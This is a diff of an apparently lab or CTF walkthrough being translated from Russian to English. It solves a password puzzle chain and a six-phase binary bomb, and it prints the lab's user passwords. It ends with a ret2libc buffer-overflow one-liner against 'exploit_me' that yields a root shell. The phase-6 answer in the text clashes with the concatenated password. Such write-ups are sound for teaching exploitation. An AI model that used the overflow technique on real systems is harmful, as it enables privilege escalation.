@@ -4,14 +4,12 @@
 We can see tar archive here. There are a lot of files in this archieve. Every file contains
 line of code and comments with number of this line. We can use our "build_program.py" script to get
 full program. Compile and run this program. Got "Iheartpwnage" password and advice to use sha-256.
-Видим архив, в котором куча файлов. Понятно, что в файлах лежат куски кода,
-также в каждом файле порядковый номер данного куска. Используя простецкий скрипт
-build_program.py добываем прогу на си и запускаем. Выводится пароль и подсказка, что
-его надо прогнать через sha-256.
 
 ### laurie
 echo -n "Iheartpwnage" | shasum -a 256
 laurie : 330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4
+
+There is bomb here. Bomb contains of 6 phases. We should input correct key in each stage.
 
 scp -P 2222 laurie@127.0.0.1:bomb ./
 
@@ -22,17 +20,17 @@ gdb bomb
     "Public speaking is very easy."
 
     disas phase_2
-    Тут читается 6 чисел. Первое - 1, и потом в цикле prev * (index(cur) + 1)
+    Program expects 6 numbers. First is 1, and every number = prev * (index(cur) + 1)
     "1 2 6 24 120 720"
 
     disas phase_3
-    Тут мне стало понятно, что попытки разобраться в асм коде будут тщетными, и я скачал cutter.
-    Видим switch-case. Нужно, чтобы первое число совпало с свитчом, буква с буквой внтри свитча и число с числом внутри свитча.
+    It is very difficult to read this asm code. And We downloaded cutter to decompile bomb. Yeah, this way is much better.
+    We see switch-case condition here and there is several correct combinations.
     0 q 777
     1 b 214
 
     phase_4
-    Рекурсивная функция, которая возвращает число. Нужно 55.
+    Recursive function, which returns sum of calls this function with num - 1 and num - 2. If num < 2 function returns 1. We need 55.
     1 -> 1
     2 -> 2
     3 -> 3
@@ -44,37 +42,31 @@ gdb bomb
     9 -> 55
 
     phase_5
-    Нужно получить слово "giants" из массива символов.
-    Вводится также слово из 6 букв.
-    Полученные индексы: 15 0 5 11 13 1.
-    Эти индексы получаются путём битового умножения аски-символа на 0xf.
-    Получаем слово "opekmq".
-    
+    So we will have some sex with bytes here.
+    We shoud get word "giants". Program expects 6 charachters.
+    Logical AND with 0xF uses for each inputed character, and then get this num as index of "isrveawhobpnutfg" array.
+    So we need indexes: 15 0 5 11 13 1.
+    Look at ascii table and get characters which hexadecimal second digit are f, 0, 5, b, d, 1. It is "opekmq".
 
     phase_6
-    Получает 6 чисел
-    4 цикла
-    1) Проверяет что числа уникальны
-    2) 3) выставляет в том порядке, который был введён
-    4) Проверяет что массив отсортирован
+    Program expects 6 numbers.
+    Inside program is array with numbers 253 725 301 997 212 432.
+    There are 4 cycles here.
+    1) Checks that each number is unique and 1 <= n <= 6.
+    2) 3) Build new array from program's array with inputed indexes.
+    4) Check that new array is sorted.
+    So we need numbers "4 2 6 3 1 5".
 
-    Числа:  253 725 301 997 212 432
-    "4 2 6 3 1 5"
-
-"Publicspeakingisveryeasy.126241207201b2149opekmq426315"
+README says to remove spaces when we have FULL the password. Ok, lets concatenate all strings and remove spaces.
+"Publicspeakingisveryeasy.126241207201b2149opekmq426135". This is password for thor.
 
 ### thor
-Используем скрипт "parse_turtle_steps.py" на файле turtle
-Получаем слово SLASH
-md5 -s SLASH
-Получаем хэш по md5: 646da671ca01bb5d84dbb5fb2238dc8e, это и есть пароль для zaz.
+Use our "parse_turtle_steps.py" script and look at word "SLASH".
+md5 -s SLASH -> "646da671ca01bb5d84dbb5fb2238dc8e" password for zaz.
 
 ### zaz
-Видим файл exploit_me. Название намекает, что его надо взломать.
-Это бинарник, который принимает аргумент и печатает его.
-Через gdb можем посмотреть, что создаётся буфер размером 144, и в него копируется аргумент через strcpy.
-Можем использовать ret2lib exploit. Для этого надо переполнить буфер и поместить в регистр eip адрес
-команды system и в качестве аргумента передать адрес строки '/bin/sh'
+You can see expolit_me file there. This program takes argument and prints it. With decompiled code we can see that there is only 140 bytes buffer inside main.
+And strcpy uses here. Excellent opportunity to overflow buffer and use ret2lib exploit.
 
 gdb exploit_me
     break main
@@ -84,8 +76,10 @@ gdb exploit_me
 
 ./exploit_me $(python -c "print('a' * 140 + '\xb7\xe6\xb0\x60'[::-1] + 'aaaa' + '\xb7\xf8\xcc\x58'[::-1])")
 
-Подробное описание эксплойта.
+Whaaat is going on? Whoami? A im root! System has been fucked.
+
+Description of ret2lib exploit.
 https://www.exploit-db.com/docs/english/28553-linux-classic-return-to-libc-&-return-to-libc-chaining-tutorial.pdf
 
-gdb шпаргалка
+Gdb useful things.
 https://darkdust.net/files/GDB%20Cheat%20Sheet.pdf
